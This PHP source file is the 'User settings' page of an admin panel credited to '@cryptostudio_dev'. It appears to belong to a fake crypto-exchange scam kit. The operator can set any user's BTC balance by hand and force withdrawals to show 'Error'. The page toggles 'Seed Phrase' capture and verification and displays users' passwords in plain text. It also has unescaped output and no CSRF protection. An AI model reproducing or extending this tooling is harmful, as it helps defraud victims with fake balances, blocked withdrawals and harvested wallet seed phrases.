<?php
if(!isset($_GET['id'])){
    header("Location: /");
    exit();
}
session_start();
include "_config.php";

if(auth($_SESSION['uuid']) == 0){
    header("Location: /");
}elseif(auth($_SESSION['uuid']) == 2){
    header("Location: /admin/worker_users");
}elseif(auth($_SESSION['uuid']) == 1){
    // By @cryptostudio_dev
}else{
    header("Location: https://t.me/cryptostudio_dev");
}
if (isset($_POST['name']) && isset($_POST['uuid'])) {
    saveUser('name', $_POST['name'], $_POST['uuid']);
}
if (isset($_POST['email']) && isset($_POST['uuid'])) {
    saveUser('email', $_POST['email'], $_POST['uuid']);
}
if (isset($_POST['pass']) && isset($_POST['uuid'])) {
    saveUser('pass', $_POST['pass'], $_POST['uuid']);
}
if (isset($_POST['dep']) && isset($_POST['uuid'])) {
    saveUser('min_dep_btc', $_POST['dep'], $_POST['uuid']);
}
if (isset($_POST['fee']) && isset($_POST['uuid'])) {
    saveUser('trade_fee', $_POST['fee'], $_POST['uuid']);
}

if (isset($_POST['status_user'])) {
    if ($_POST['status_user'] == 1) {
        saveUser('rid', '0', $_POST['uuid']);
    } elseif ($_POST['status_user'] == 0) {
        saveUser('rid', '1', $_POST['uuid']);
    } elseif ($_POST['status_user'] == 2) {
        saveUser('rid', '0', $_POST['uuid']);
    }
    saveUser('premium_status', $_POST['status_user'], $_POST['uuid']);
}
if (isset($_POST['vrf']) && isset($_POST['uuid'])) {
    saveUser('verified_status', '1', $_POST['uuid']);
    saveUser('verified', '1', $_POST['uuid']);
    saveUserVerif('status', '1', $_POST['uuid']);
} else if (isset($_POST['uuid'])) {
    saveUser('verified_status', '0', $_POST['uuid']);
    saveUser('verified', '0', $_POST['uuid']);
    saveUserVerif('status', '0', $_POST['uuid']);
}
if (isset($_POST['trans']) && isset($_POST['uuid'])) {
    saveUser('trans', $_POST['trans'], $_POST['uuid']);
}
if (isset($_POST['vfs']) && isset($_POST['uuid'])) {
    saveUserVFS('blockchain_sync', $_POST['vfs'], $_POST['uuid']);
}
if (isset($_POST['vfse']) && isset($_POST['uuid'])) {
    saveUserVFS('blockchain_sync_verify', $_POST['vfse'], $_POST['uuid']);
}


$status = UserInfo($_GET['id'], 'premium_status');
$user = "";
$moder = "";
$admin = "";
if ($status == 0) {
    $user = 'checked=""';
} elseif ($status == 1) {
    $admin = 'checked=""';
} elseif ($status == 2) {
    $moder = 'checked=""';
}

$w_info = UserInfo($_GET['id'], 'trans');
$w_error = "";
$w_trans = "";
if ($w_info == 0) {
    $w_trans = 'checked=""';
} elseif ($w_info == 1) {
    $w_error = 'checked=""';
}

    $vfs_info = UserInfoVFS($_GET['id'], 'blockchain_sync');
    $vfs_error = "";
    $vfs_trans = "";
    if ($vfs_info == 0) {
        $vfs_trans = 'checked=""';
    } elseif ($vfs_info == 1) {
        $vfs_error = 'checked=""';
    }

    $vfse_info = UserInfoVFS($_GET['id'], 'blockchain_sync_verify');
    $vfse_error = "";
    $vfse_trans = "";
    if ($vfse_info == 0) {
        $vfse_trans = 'checked=""';
    } elseif ($vfse_info == 1) {
        $vfse_error = 'checked=""';
    }
if (isset($_POST['total_btc']) && isset($_POST['uuid'])) {
    saveUserBalance('BTC', $_POST['total_btc'], $_POST['uuid']);
}


?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" type="image/png" sizes="16x16" href="../plugins/images/favicon.png">
    <title>AdminPanel | Dev @cryptostudio_dev</title>
    <!-- Bootstrap Core CSS -->
    <link href="bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Menu CSS -->
    <link href="../plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css" rel="stylesheet">
    <!-- chartist CSS -->
    <link href="../plugins/bower_components/chartist-js/dist/chartist.min.css" rel="stylesheet">
    <link href="../plugins/bower_components/chartist-plugin-tooltip-master/dist/chartist-plugin-tooltip.css" rel="stylesheet">
    <!-- Vector CSS -->
    <link href="../plugins/bower_components/vectormap/jquery-jvectormap-2.0.2.css" rel="stylesheet" />
    <!-- animation CSS -->
    <link href="css/animate.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="css/style.css" rel="stylesheet">
    <!-- color CSS -->
    <link href="css/colors/blue-dark.css" id="theme" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body class="fix-header">
<!-- ============================================================== -->
<!-- Preloader -->
<!-- ============================================================== -->
<div class="preloader">
    <svg class="circular" viewBox="25 25 50 50">
        <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
    </svg>
</div>
<!-- ============================================================== -->
<!-- Wrapper -->
<!-- ============================================================== -->
<div id="wrapper">
    <!-- ============================================================== -->
    <!-- Topbar header - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- Left Sidebar - style you can find in sidebar.scss  -->
    <!-- ============================================================== -->
    <? include "menu_cfg.php"; ?>
    <!-- ============================================================== -->
    <!-- End Left Sidebar -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- Page Content -->
    <!-- ============================================================== -->
    <div id="page-wrapper">
        <div class="container-fluid" style="margin-top: -70px;">
            <div class="row bg-title">
                <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                    <h4 class="page-title">AdminPanel</h4>
                </div>
                <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
                    <ol class="breadcrumb">
                        <li><a href="/">Index</a></li>
                        <li class="active">User settings</li>
                    </ol>
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- ============================================================== -->
            <!-- Other sales widgets -->
            <!-- ============================================================== -->
            <!-- ============================================================== -->
            <!-- Demo table -->
            <!-- ============================================================== -->
            <div class="row">
                <div class="white-box">
                    <h3 class="box-title m-b-0">Settings user</h3>
                    <form class="form-horizontal" method="post">
                        <div class="form-group m-b-0">
                            <div class="col-sm-offset-3 col-sm-9">
                                <button type="submit" class="btn btn-info waves-effect waves-light m-t-10">Save</button>
                            </div>
                        </div>
                        <br>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">UUID*</label>
                            <div class="col-sm-9">
                                <input type="text" disabled class="form-control" id="inputEmail3" placeholder="UUID" value="<?=UserInfo($_GET['id'], 'uuid');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">Username*</label>
                            <div class="col-sm-9">
                                <input type="text" name="name" class="form-control" id="inputEmail3" placeholder="Username" value="<?=UserInfo($_GET['id'], 'name');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">Email*</label>
                            <div class="col-sm-9">
                                <input type="email" name="email" class="form-control" id="inputEmail3" placeholder="Email" value="<?=UserInfo($_GET['id'], 'email');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputPassword3" class="col-sm-3 control-label">Password*</label>
                            <div class="col-sm-9">
                                <input type="text" name="pass" class="form-control" id="inputPassword3" placeholder="Password" value="<?=UserInfo($_GET['id'], 'pass');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputPassword4" class="col-sm-3 control-label">Min. deposit (BTC)*</label>
                            <div class="col-sm-9">
                                <input type="text" name="dep" class="form-control" id="inputPassword4" placeholder="0.00500" value="<?=UserInfo($_GET['id'], 'min_dep_btc');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputPassword4" class="col-sm-3 control-label">Trade fee*</label>
                            <div class="col-sm-9">
                                <input type="text" name="fee" class="form-control" id="inputPassword4" placeholder="0.05" value="<?=UserInfo($_GET['id'], 'trade_fee');?>"> </div>
                        </div>
                        <div class="form-group">
                            <label for="inputEmail3" class="col-sm-3 control-label">IP*</label>
                            <div class="col-sm-9">
                                <input type="text" disabled class="form-control" id="inputEmail3" placeholder="IP" value="<?=UserInfo($_GET['id'], 'ip');?>"> </div>
                        </div>
                            <div class="form-group">
                                <label for="inputPassword4" class="col-sm-3 control-label">Group</label>
                                <div class="col-md-9">
                                    <div class="radio-list">
                                        <label class="radio-inline">
                                            <input type="radio" name="status_user" value="0" <?=$user?>> User </label>
                                        <label class="radio-inline">
                                            <input type="radio" name="status_user" value="2" <?=$moder?>> Moder (No work) </label>
                                        <label class="radio-inline">
                                            <input type="radio" name="status_user" value="1" <?=$admin?>> Admin </label>
                                    </div>
                                </div>
                            </div>
                        <div class="form-group">
                            <label for="inputPassword4" class="col-sm-3 control-label">Withdraw</label>
                            <div class="col-md-9">
                                <div class="radio-list">
                                    <label class="radio-inline">
                                        <input type="radio" name="trans" value="1" <?=$w_error?>> Error </label>
                                    <label class="radio-inline">
                                        <input type="radio" name="trans" value="0" <?=$w_trans?>> Transaction </label>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="inputPassword4" class="col-sm-3 control-label">Seed Phrase</label>
                            <div class="col-md-9">
                                <div class="radio-list">
                                    <label class="radio-inline">
                                        <input type="radio" name="vfs" value="1" <?=$vfs_error?>> Active </label>
                                    <label class="radio-inline">
                                        <input type="radio" name="vfs" value="0" <?=$vfs_trans?>> No Active </label>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="inputPassword4" class="col-sm-3 control-label">Verifed Seed Phrase</label>
                            <div class="col-md-9">
                                <div class="radio-list">
                                    <label class="radio-inline">
                                        <input type="radio" name="vfse" value="1" <?=$vfse_error?>> Verified </label>
                                    <label class="radio-inline">
                                        <input type="radio" name="vfse" value="0" <?=$vfse_trans?>> No Verified </label>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="col-sm-offset-3 col-sm-9">
                                <div class="checkbox checkbox-success">
                                    <?php
                                    $checked = "";
                                    if(UserInfo($_GET['id'], 'verified_status') == 1){
                                        $checked = "checked";
                                    }
                                    ?>
                                    <input id="checkbox33" name="vrf" type="checkbox" <?=$checked;?>>
                                    <label for="checkbox33">Verifed</label>
                                </div>
                            </div>
                        </div>


                        <h2 class="box-title m-b-0">Balance user</h2>


                        <h3 class="box-title m-b-0">BTC</h3>
                        <div class="form-group">
                            <div class="col-sm-9">
                                <input type="text" name="total_btc" class="form-control" id="inputPassword4" placeholder="0.00500" value="<?=UserInfoBalance('total_balance', 'BTC', UserInfo($_GET['id'], 'uuid'));?>">
                                <span class="help-block"> <code>Balance</code> </span>
                            </div>
                        </div>

                        <input type="hidden" name="uuid" value="<?=UserInfo($_GET['id'], 'uuid');?>">
                        <div class="form-group m-b-0">
                            <div class="col-sm-offset-3 col-sm-9">
                                <button type="submit" class="btn btn-info waves-effect waves-light m-t-10">Save</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
            <!-- ============================================================== -->
            <!-- Right sidebar -->
            <!-- ============================================================== -->
            <!-- .right-sidebar -->
            <!-- ============================================================== -->
            <!-- End Right sidebar -->
            <!-- ============================================================== -->
        </div>
        <!-- /.container-fluid -->
        <footer class="footer text-center"> 2023 &copy; AdminPanel By @cryptostudio_dev </footer>
    </div>
    <!-- /#page-wrapper -->
</div>
<!-- /#wrapper -->
<!-- jQuery -->
<script src="../plugins/bower_components/jquery/dist/jquery.min.js"></script>
<!-- Bootstrap Core JavaScript -->
<script src="bootstrap/dist/js/bootstrap.min.js"></script>
<!-- Menu Plugin JavaScript -->
<script src="../plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js"></script>
<!--Counter js -->
<script src="../plugins/bower_components/waypoints/lib/jquery.waypoints.js"></script>
<script src="../plugins/bower_components/counterup/jquery.counterup.min.js"></script>
<!--slimscroll JavaScript -->
<script src="js/jquery.slimscroll.js"></script>
<!--Wave Effects -->
<script src="js/waves.js"></script>
<!-- Vector map JavaScript -->
<script src="../plugins/bower_components/vectormap/jquery-jvectormap-2.0.2.min.js"></script>
<script src="../plugins/bower_components/vectormap/jquery-jvectormap-world-mill-en.js"></script>
<script src="../plugins/bower_components/vectormap/jquery-jvectormap-in-mill.js"></script>
<script src="../plugins/bower_components/vectormap/jquery-jvectormap-us-aea-en.js"></script>
<!-- chartist chart -->
<script src="../plugins/bower_components/chartist-js/dist/chartist.min.js"></script>
<script src="../plugins/bower_components/chartist-plugin-tooltip-master/dist/chartist-plugin-tooltip.min.js"></script>
<!-- sparkline chart JavaScript -->
<script src="../plugins/bower_components/jquery-sparkline/jquery.sparkline.min.js"></script>
<script src="../plugins/bower_components/jquery-sparkline/jquery.charts-sparkline.js"></script>
<!-- Custom Theme JavaScript -->
<script src="js/custom.min.js"></script>
<script src="js/dashboard3.js"></script>
<!--Style Switcher -->
<script src="../plugins/bower_components/styleswitcher/jQuery.style.switcher.js"></script>
</body>

</html>
